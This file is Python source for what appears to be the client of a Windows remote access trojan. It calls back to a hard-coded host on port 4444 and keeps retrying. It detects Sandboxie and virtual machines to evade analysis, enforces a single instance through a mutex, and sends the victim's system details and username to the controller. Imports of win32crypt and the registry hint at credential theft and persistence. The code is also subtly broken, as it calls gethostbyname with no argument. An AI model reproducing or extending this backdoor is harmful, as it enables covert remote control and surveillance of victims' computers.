# need install python packages before running code
# python -m pip install pywin32 pyscreeze

import socket, os, sys, platform, time, ctypes, subprocess, threading, wmi

import win32api, winerror, win32event, win32crypt

from winreg import *

strHost = "192.168.0.98"
intPort = 4444

strPath = os.path.realpath(sys.argv[0])
TMP = os.environ['APPDATA']

intBuff = 1024
#only one single thread - prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXIST:
    mutex = None
    sys.exit(0)


def detectSandboxie():
    try:
        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")

        return " (Sandboxie) "

    except: return ""

def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select *  from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return " (Virtual Machine) "
    return ""

def server_connect():
    global obj_socket

    while True:
        try:
            obj_socket = socket.socket()
            obj_socket.connect((strHost, intPort))

        except socket.error:
            time.sleep(5)  #after 5 second will try again

        else: break

    str_user_info = socket.gethostbyname() + "'," + platform.system() + "  " + platform.release() + detectSandboxie() + detectVM() + "', " + os.environ["USERNAME"]
    send(str.encode(str_user_info))

decode_utf8 = lambda data: data.decode("utf-8")

recv = lambda buffer: obj_socket.recv(buffer)

send = lambda data: obj_socket.send(data)

server_connect()

while True:
    try:
        while True:
            str_data = recv(intBuff)
            str_data = decode_utf8(str_data)

            if str_data == "exit":
                obj_socket.close()
                sys.exit(0)

    except socket.error:
        obj_socket.close()
        del obj_socket

        server_connect()
